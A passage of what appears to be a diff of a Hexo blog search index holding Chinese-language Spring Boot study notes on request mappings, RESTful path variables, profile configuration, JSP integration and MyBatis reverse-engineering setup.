-<h2 id="1-5-PutMapping改"><a href="#1-5-PutMapping改" class="headerlink" title="1.5 @PutMapping改"></a>1.5 @PutMapping改</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//    @RequestMapping(value = &quot;/update&quot;,method = RequestMethod.PUT)</span></span><br><span class="line"><span class="meta">@PutMapping(value = &quot;/update&quot;)</span></span><br><span class="line"><span class="comment">//    更改数据时候使用</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">update</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;update student info&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h1 id="2-RESTful风格"><a href="#2-RESTful风格" class="headerlink" title="2.RESTful风格"></a>2.RESTful风格</h1><p>localhost:8080/sutdent?id=1001&amp;age=23</p>
-<p>可以优化为</p>
-<p>localhost:8080/sutdent?/1001/23</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StudentController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/student/detail/&#123;id&#125;/&#123;age&#125;&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">student1</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span> Integer id,</span></span></span><br><span class="line"><span class="function"><span class="params">                           <span class="meta">@PathVariable(&quot;age&quot;)</span> Integer age)</span> </span>&#123;</span><br><span class="line">        Map&lt;String, Object&gt; retMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        retMap.put(<span class="string">&quot;id&quot;</span>, id);</span><br><span class="line">        retMap.put(<span class="string">&quot;age&quot;</span>, age);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> retMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/student/detail/&#123;id&#125;/&#123;status&#125;&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">student2</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span> Integer id,</span></span></span><br><span class="line"><span class="function"><span class="params">                           <span class="meta">@PathVariable(&quot;status&quot;)</span> Integer status)</span> </span>&#123;</span><br><span class="line">        Map&lt;String, Object&gt; retMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        retMap.put(<span class="string">&quot;id&quot;</span>, id);</span><br><span class="line">        retMap.put(<span class="string">&quot;status&quot;</span>, status);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> retMap;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<font color="ff0000">以上代码studen1和studen2出现请求模糊</font>
-
-<p>使用时候需要注意增删改查的请求方式进行区分&lt;/font&gt;</p>
-<ul>
-<li><p>student1需要加@GetMapping、student2需要加@DeleteMapping</p>
-</li>
-<li><p>修改请求路径顺序</p>
-</li>
-</ul>
-]]></content>
-      <categories>
-        <category>SpringBoot学习</category>
-      </categories>
-      <tags>
-        <tag>SpringBoot学习</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SpringBoot-逆向工程</title>
-    <url>/post/1511e846.html</url>
-    <content><![CDATA[<p>　　之前建立实体类，需要手动慢慢建立，很没有效率，了解了逆向工程之后，确实很方便<span id="more"></span></p>
-<h1 id="1-返回json数据"><a href="#1-返回json数据" class="headerlink" title="1.返回json数据"></a>1.返回json数据</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.gyl.springboot.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/say&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="meta">@ResponseBody</span> <span class="function">Object <span class="title">m</span><span class="params">(String message)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Say:Hello&quot;</span> + message;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/mapvalue&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="meta">@ResponseBody</span> <span class="function">Map&lt;String, Object&gt; <span class="title">mapvalue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Map&lt;String, Object&gt; retMap = <span class="keyword">new</span> HashMap&lt;String, Object&gt;();</span><br><span class="line">        retMap.put(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;hello SpringBoot&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> retMap;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>在浏览器中url后面加上<code>?message=World</code></p>
-<p>就会显示Say:HelloWorld</p>
-<p>访问localhost:8080/mapvalue可以显示</p>
-<p>message:hello SpringBoot</p>
-<h1 id="2-核心配置文件"><a href="#2-核心配置文件" class="headerlink" title="2.核心配置文件"></a>2.核心配置文件</h1><h2 id="2-1-三类配置文件比较"><a href="#2-1-三类配置文件比较" class="headerlink" title="2.1 三类配置文件比较"></a>2.1 三类配置文件比较</h2><p>properties</p>
-<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="meta">server.port</span>=<span class="string">9090</span></span><br><span class="line"><span class="meta">server.servlet.context-path</span>=<span class="string">/</span></span><br></pre></td></tr></table></figure>
-<p>yml和yaml格式一样，只是名字不一样</p>
-<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span></span><br><span class="line">  <span class="attr">servlet:</span></span><br><span class="line">    <span class="attr">context-path:</span> <span class="string">/</span></span><br></pre></td></tr></table></figure>
-<p>当yml/properties文件同时存在时，以properties文件为准</p>
-<h1 id="3-多环境下核心配置文件"><a href="#3-多环境下核心配置文件" class="headerlink" title="3.多环境下核心配置文件"></a>3.多环境下核心配置文件</h1><p>开发环境—&gt;测试环境—&gt;准生产环境—&gt;生产环境</p>
-<p>yml和properties一样，只是后缀不一样</p>
-<p>主核心配置文件</p>
-<p><code>application.properties</code></p>
-<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="meta">spring.profiles.active</span>=<span class="string">dev</span></span><br></pre></td></tr></table></figure>
-<p>多配置文件要以application-开头</p>
-<p><code>application-dev.properties</code>开发环境</p>
-<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="meta">server.port</span>=<span class="string">9090</span></span><br><span class="line"><span class="meta">server.servlet.context-path</span>=<span class="string">/dev</span></span><br></pre></td></tr></table></figure>
-<p><code>application-test.properties</code>测试环境</p>
-<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="meta">server.port</span>=<span class="string">9090</span></span><br><span class="line"><span class="meta">server.servlet.context-path</span>=<span class="string">/test</span></span><br></pre></td></tr></table></figure>
-<p><code>application-ready.properties</code>准生产环境</p>
-<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="meta">server.port</span>=<span class="string">9090</span></span><br><span class="line"><span class="meta">server.servlet.context-path</span>=<span class="string">/ready</span></span><br></pre></td></tr></table></figure>
-<p><code>application-product.properties</code>生产环境</p>
-<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="meta">server.port</span>=<span class="string">9090</span></span><br><span class="line"><span class="meta">server.servlet.context-path</span>=<span class="string">/product</span></span><br></pre></td></tr></table></figure>
-<h1 id="4-集成jsp"><a href="#4-集成jsp" class="headerlink" title="4.集成jsp"></a>4.集成jsp</h1><p>首先，创建webapp资源文件夹，并设置该文件夹为web项目文件夹。</p>
-<p>之后，在pom.xml中引入SpringBoot内嵌tomcat对jsp的解依赖</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-embed-jasper<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>然后，在pom.xml下指定编译路径在\<build>\</build>中</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--源文件夹--&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/webapp<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--指定编译到META-INF/resources--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">targetPath</span>&gt;</span>META-INF/resources<span class="tag">&lt;/<span class="name">targetPath</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--指定源文件夹中的哪个资源要编译进行--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">        	<span class="tag">&lt;<span class="name">include</span>&gt;</span>*.*<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>最后，在application.properties中配置视图解析器</p>
-<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="meta">spring.mvc.view.prefix</span>=<span class="string">/</span></span><br><span class="line"><span class="meta">spring.mvc.view.suffix</span>=<span class="string">.jsp</span></span><br></pre></td></tr></table></figure>
-<h1 id="5-集成MyBatis依赖"><a href="#5-集成MyBatis依赖" class="headerlink" title="5.集成MyBatis依赖"></a>5.集成MyBatis依赖</h1><p>导入MaBatis依赖支持</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--MySQL驱动--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--MyBatis整合SpringBoot框架的起步依赖--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<h2 id="5-1-MyBatis逆向工程"><a href="#5-1-MyBatis逆向工程" class="headerlink" title="5.1 MyBatis逆向工程"></a>5.1 MyBatis逆向工程</h2><p><strong>1.GeneratorMapper.xml</strong></p>
-<p>在根目录下创建GeneratorMapper.xml</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">generatorConfiguration</span></span></span><br><span class="line"><span class="meta">        <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//mybatis.org//DTD MyBatis Generator Configuration 1.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="meta-string">&quot;http://mybatis.org/dtd/mybatis-generator-config_1_0.dtd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">generatorConfiguration</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--指定连接数据库的JDBC 驱动包所在位置，指定到你本机的完整路径--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">classPathEntry</span></span></span><br><span class="line"><span class="tag">            <span class="attr">location</span>=<span class="string">&quot;D:\JavaTools\Maven\Mavenrespository\mysql\mysql-connector-java\8.0.22\mysql-connector-java-8.0.22.jar&quot;</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--配置table表信息内容体，targetRuntime 指定采用MyBatis3的版本--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context</span> <span class="attr">id</span>=<span class="string">&quot;testTables&quot;</span> <span class="attr">targetRuntime</span>=<span class="string">&quot;MyBatis3&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--抑制生成注释，由于生成的注释都是英文的，可以不让它生成--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">commentGenerator</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;suppressAllComments&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">commentGenerator</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--配置数据库连接信息--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">jdbcConnection</span> <span class="attr">driverClass</span>=<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span></span></span><br><span class="line"><span class="tag">                        <span class="attr">connectionURL</span>=<span class="string">&quot;jdbc:mysql://localhost:3306/springboot_student?useUnicode=true<span class="symbol">&amp;amp;</span>characterEncoding=utf-8<span class="symbol">&amp;amp;</span>useSSL=false<span class="symbol">&amp;amp;</span>serverTimezone=GMT%2B8&quot;</span></span></span><br><span class="line"><span class="tag">                        <span class="attr">userId</span>=<span class="string">&quot;root&quot;</span></span></span><br><span class="line"><span class="tag">                        <span class="attr">password</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;nullCatalogMeansCurrent&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;/<span class="name">jdbcConnection</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!--生成model 类，targetPackage 指定 model 类的包名，targetProject 指定</span></span><br><span class="line"><span class="comment">        生成的 model放在eclipse的哪个工程下面--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">javaModelGenerator</span> <span class="attr">targetPackage</span>=<span class="string">&quot;com.springboot.model&quot;</span></span></span><br><span class="line"><span class="tag">                            <span class="attr">targetProject</span>=<span class="string">&quot;src/main/java&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;enableSubPackages&quot;</span> <span class="attr">value</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;trimStrings&quot;</span> <span class="attr">value</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">javaModelGenerator</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--生成 MyBatis的Mapper.xml文件，targetPackage 指定 mapper.xml文件的包名，targetProject 指定生成的 mapper.xml放在 eclipse的哪个工程下面</span></span><br><span class="line"><span class="comment">        --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">sqlMapGenerator</span> <span class="attr">targetPackage</span>=<span class="string">&quot;com.springboot.mapper&quot;</span></span></span><br><span class="line"><span class="tag">                         <span class="attr">targetProject</span>=<span class="string">&quot;src/main/java&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;enableSubPackages&quot;</span> <span class="attr">value</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">sqlMapGenerator</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--生成 MyBatis的 Mapper接口类文件,targetPackage 指定 Mapper 接口类的包名，targetProject 指定生成的 Mapper 接口放在eclipse 的哪个工程下面</span></span><br><span class="line"><span class="comment">        --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">javaClientGenerator</span> <span class="attr">type</span>=<span class="string">&quot;XMLMAPPER&quot;</span></span></span><br><span class="line"><span class="tag">                             <span class="attr">targetPackage</span>=<span class="string">&quot;com.springboot.mapper&quot;</span></span></span><br><span class="line"><span class="tag">                             <span class="attr">targetProject</span>=<span class="string">&quot;src/main/java&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;enableSubPackages&quot;</span> <span class="attr">value</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">javaClientGenerator</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--数据库表名及对应的Java模型类名，数据库有多少张表就配置几个table--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">table</span> <span class="attr">tableName</span>=<span class="string">&quot;t_student&quot;</span> <span class="attr">domainObjectName</span>=<span class="string">&quot;Student&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">enableCountByExample</span>=<span class="string">&quot;false&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">enableUpdateByExample</span>=<span class="string">&quot;false&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">enableDeleteByExample</span>=<span class="string">&quot;false&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">enableSelectByExample</span>=<span class="string">&quot;false&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">selectByExampleQueryId</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">context</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">generatorConfiguration</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p><strong>2.在pom.xml文件中导入MyBatis-generator插件</strong></p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"> <span class="comment">&lt;!--MyBatis整合SpringBoot框架的起步依赖--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.1.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.generator<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-generator-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.3.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    	<span class="comment">&lt;!--配置文件的位置--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">configurationFile</span>&gt;</span>GeneratorMapper.xml<span class="tag">&lt;/<span class="name">configurationFile</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">verbose</span>&gt;</span>true<span class="tag">&lt;/<span class="name">verbose</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">overwrite</span>&gt;</span>true<span class="tag">&lt;/<span class="name">overwrite</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://s3.ax1x.com/2021/03/15/6BsMTg.png" alt="6BsMTg.png"></p>
-<p>然后查看生成的StudentMapper.xml</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">&quot;BaseResultMap&quot;</span> <span class="attr">type</span>=<span class="string">&quot;com.springboot.model.Student&quot;</span>&gt;</span></span><br><span class="line">     <span class="comment">&lt;!--id标签只能修改主键字段--&gt;</span></span><br><span class="line">     <span class="comment">&lt;!--result除了主键以外的字段--&gt;</span></span><br><span class="line">     <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">	column数据库中的字段名称	</span></span><br><span class="line"><span class="comment">		property映射对象的属性名称</span></span><br><span class="line"><span class="comment">	jdbcType列中数据库中字段的类型（可以省略不写）</span></span><br><span class="line"><span class="comment">	--&gt;</span></span><br><span class="line">     <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">	resultMap作用</span></span><br><span class="line"><span class="comment">	1.当数据库中字段名称与实体对象的属性名不一致时，可以进行转换</span></span><br><span class="line"><span class="comment">	2.当前查询的结果没有对象一个表的时候，可以自定义一个结果集		</span></span><br><span class="line"><span class="comment">	--&gt;</span></span><br><span class="line">     <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">	数据库字段名称		实体对象属性名称</span></span><br><span class="line"><span class="comment">	user_name		userName</span></span><br><span class="line"><span class="comment">	product_type	productType</span></span><br><span class="line"><span class="comment">	--&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">id</span> <span class="attr">column</span>=<span class="string">&quot;id&quot;</span> <span class="attr">jdbcType</span>=<span class="string">&quot;INTEGER&quot;</span> <span class="attr">property</span>=<span class="string">&quot;id&quot;</span> /&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;name&quot;</span> <span class="attr">jdbcType</span>=<span class="string">&quot;VARCHAR&quot;</span> <span class="attr">property</span>=<span class="string">&quot;name&quot;</span> /&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;age&quot;</span> <span class="attr">jdbcType</span>=<span class="string">&quot;INTEGER&quot;</span> <span class="attr">property</span>=<span class="string">&quot;age&quot;</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--抽取公共部分，方便下面include引用--&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">sql</span> <span class="attr">id</span>=<span class="string">&quot;Base_Column_List&quot;</span>&gt;</span></span><br><span class="line">   id, name, age</span><br><span class="line"> <span class="tag">&lt;/<span class="name">sql</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p><strong>3.指定资源文件夹</strong></p>
-<p>在pom.xml文件中的build下添加，扫描StudentMapper.xml</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--        手动指定文件夹为resources--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/java<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.xml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p><strong>4.配置application.properties文件</strong></p>
-<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="comment">#配置内嵌Tomcat端口号</span></span><br><span class="line"><span class="meta">server.port</span>=<span class="string">9090 </span></span><br><span class="line"><span class="comment">#配置项目上下文根</span></span><br><span class="line"><span class="meta">server.servlet.context-path</span>=<span class="string">/</span></span><br><span class="line"><span class="comment">#配置数据库的连接信息</span></span><br><span class="line"><span class="comment"># 注意这里的驱动类有变化</span></span><br><span class="line"><span class="meta">spring.datasource.driver-class-name</span>=<span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line"><span class="meta">spring.datasource.url</span>=<span class="string">jdbc:mysql://localhost:3306/springboot_student?useUnicode=true&amp;characterEncoding=utf-8&amp;useSSL=false&amp;serverTimezone=GMT%2B8</span></span><br><span class="line"><span class="meta">spring.datasource.username</span>=<span class="string">root</span></span><br><span class="line"><span class="meta">spring.datasource.password</span>=<span class="string">root</span></span><br></pre></td></tr></table></figure>
-<h2 id="5-2-业务逻辑"><a href="#5-2-业务逻辑" class="headerlink" title="5.2 业务逻辑"></a>5.2 业务逻辑</h2><p>Controller—&gt;Service—&gt;ServiceImpl</p>
-<p>先Controller</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StudentController</span></span>&#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> StudentService studentService;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@RequestMapping(value = &quot;/student&quot;)</span></span><br><span class="line">	<span class="keyword">public</span> <span class="meta">@ResponseBody</span> <span class="function">Student <span class="title">queryStudentById</span><span class="params">(Integer id)</span></span>&#123;</span><br><span class="line">        <span class="comment">//调用业务层方法</span></span><br><span class="line">        Student student = studentService.queryStudentById(id);</span><br><span class="line">		<span class="keyword">return</span> student;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>然后写Service层</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">StudentService</span> </span>&#123;</span><br><span class="line">    <span class="comment">//根据学生id查询详情</span></span><br><span class="line">    <span class="function">Student <span class="title">queryStudentById</span><span class="params">(Integer id)</span></span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>再写ServiceImpl类</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StudentServiceImpl</span> <span class="keyword">implements</span> <span class="title">StudentService</span></span>&#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> StudentMapper studentMapper;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Student <span class="title">queryStudentById</span><span class="params">(Integer id)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> studentMapper.selectByPrimaryKey(id);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>在入口类上写上@MapperScan(basePackages = “”)注解</p>
-<h2 id="5-3-MyBatis映射文件方法有两种"><a href="#5-3-MyBatis映射文件方法有两种" class="headerlink" title="5.3 MyBatis映射文件方法有两种"></a>5.3 MyBatis映射文件方法有两种</h2><ul>
-<li>第一种</li>
-</ul>
-<p>当接口类和xml文件在一块时，在pom.xml中的build标签中添加</p>
